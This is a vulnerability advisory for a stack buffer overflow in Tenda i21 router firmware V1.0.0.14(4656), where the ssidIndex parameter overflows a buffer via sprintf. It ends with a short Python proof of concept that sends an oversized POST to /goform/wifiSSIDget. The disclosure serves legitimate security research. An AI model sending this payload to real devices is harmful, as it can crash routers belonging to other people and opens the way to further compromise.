## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2982.html

## Affected version

i21 V1.0.0.14(4656)

## Vulnerability details

In the i21 V1.0.0.14(4656) firmware has a stack overflow vulnerability in the `formwrlSSIDget` function. The `index` variable receives the `ssidIndex` parameter from a POST request. However, since the user can control the input of `ssidIndex`, the statement `sprintf(mib_prefix, "wl2g.ssid%s.", index);` can cause a buffer overflow. The user-provided  `ssidIndex` can exceed the capacity of the `mib_prefix` array, triggering this security vulnerability.

![image-20240419162724188](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240419162724188.png)

![image-20240419163010466](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240419163010466.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/wifiSSIDget"
payload = b"a"*2000

data = {"radio": "2.4G", "ssidIndex": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240419162115799](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240419162115799.png)
